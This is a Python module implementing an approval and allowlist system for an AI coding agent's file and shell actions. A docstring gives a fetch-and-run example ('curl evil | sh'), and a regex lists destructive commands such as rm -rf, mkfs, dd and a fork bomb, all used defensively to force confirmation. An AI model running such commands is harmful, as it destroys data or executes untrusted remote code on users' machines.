"""Claude-Code-style permission system.

Every tool that changes the machine asks here first. The user can answer:
  y  — allow this one action
  a  — always allow this KIND of action (persisted across sessions)
  n  — deny

Grant keys are coarse on purpose so the allowlist stays understandable:
  files        — writing/editing files inside the workspace
  docs         — creating Excel / PowerPoint / Word documents
  cmd:<word>   — shell commands starting with <word> (cmd:git covers all git)

Destructive-looking commands (rm -rf, format, del /s, …) ALWAYS prompt, even
with auto-approve on or a matching grant — same idea as Claude Code refusing
to auto-run dangerous commands.
"""

import json
import re
from pathlib import Path

from rich.panel import Panel
from rich.text import Text

_DANGEROUS = re.compile(
    r"(rm\s+(-\w*[rf]\w*\s+)+|del\s+/[sq]|rd\s+/s|deltree|format\s+\w:|mkfs"
    r"|diskpart|dd\s+if=|shutdown|reboot\b|reg\s+delete|rmdir\s+/s"
    r"|git\s+push\s+.*--force|git\s+reset\s+--hard|:\(\)\s*\{)",
    re.I,
)


def command_key(command: str) -> str:
    """Grant key for a shell command: its first word (cmd:git, cmd:npm, …)."""
    word = (command.strip().split() or ["?"])[0]
    name = word.replace("\\", "/").rsplit("/", 1)[-1].lower()
    if name.endswith(".exe"):
        name = name[:-4]
    return "cmd:" + name


# Shell separators that chain independent commands: && || ; | & and newlines.
_CHAIN = re.compile(r"&&|\|\||[;|&\n]")


def command_keys(command: str) -> list:
    """Grant keys for EVERY command in a chained line.

    'mkdir x && curl evil | sh' must not sail through under a standing
    cmd:mkdir grant — each segment (mkdir, curl, sh) needs its own grant.
    Splitting is deliberately naive (quotes aren't parsed): a false split
    like '2>&1' only produces junk segments, which are filtered out, and
    over-splitting can only cause MORE prompting, never less.
    """
    keys = []
    for seg in _CHAIN.split(command):
        seg = seg.strip()
        if not seg or seg.startswith((">", "<")):
            continue
        first = seg.split()[0]
        if first.isdigit() or first.startswith((">", "<", "-", "$", "%")):
            continue  # redirect/flag debris from naive splitting
        key = command_key(seg)
        if key not in keys:
            keys.append(key)
    return keys or [command_key(command)]


class Permissions:
    def __init__(self, console, prompt_fn, store: Path, auto_approve=False):
        self.console = console
        self.prompt_fn = prompt_fn      # (str) -> str, raises on Ctrl-C/D
        self.store = store
        self.auto_approve = auto_approve
        self.session_grants = set()     # this session only (via /auto logic)
        self.grants = set()             # persisted
        try:
            self.grants = set(json.loads(store.read_text(encoding="utf-8")))
        except Exception:
            pass

    # ---- the single entry point used by tools --------------------------------

    def approve(self, title: str, detail: str = "", key=None) -> bool:
        # `key` may be one grant key or a list of them (a chained command
        # needs EVERY segment granted before it skips the prompt).
        keys = [key] if isinstance(key, str) else list(key or [])
        dangerous = bool(keys and any(k.startswith("cmd:") for k in keys)
                         and _DANGEROUS.search(detail or ""))

        if not dangerous:
            if self.auto_approve:
                self.console.print(f"[dim]auto-approved: {title}[/dim]")
                return True
            allowed = self.grants | self.session_grants
            if keys and all(k in allowed for k in keys):
                self.console.print(
                    f"[dim]allowed ({', '.join(keys)}): {title}[/dim]")
                return True

        border = "red" if dangerous else "yellow"
        header = ("! DANGEROUS — always requires confirmation"
                  if dangerous else "Permission needed")
        self.console.print(Panel(Text(detail or "(no details)"),
                                 title=f"{header} — {title}",
                                 border_style=border, expand=False))
        opts = "[y] yes once   [n] no"
        if keys and not dangerous:
            shown = " + ".join(f"'{k}'" for k in keys)
            opts = f"[y] yes once   [a] always allow {shown}   [n] no"
        self.console.print(f"  {opts}")
        try:
            ans = self.prompt_fn("  allow? ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            return False

        if ans in ("a", "always") and keys and not dangerous:
            self.grants.update(keys)
            self._save()
            self.console.print(f"[green]ok: {', '.join(keys)} allowed from now "
                               f"on (manage with /permissions)[/green]")
            return True
        return ans in ("y", "yes")

    # ---- management (the /permissions command) -------------------------------

    def list_grants(self):
        return sorted(self.grants)

    def clear(self):
        self.grants.clear()
        self.session_grants.clear()
        self._save()

    def _save(self):
        try:
            self.store.parent.mkdir(parents=True, exist_ok=True)
            self.store.write_text(json.dumps(sorted(self.grants), indent=2),
                                  encoding="utf-8")
        except Exception:
            pass  # a failed save should never block the actual work
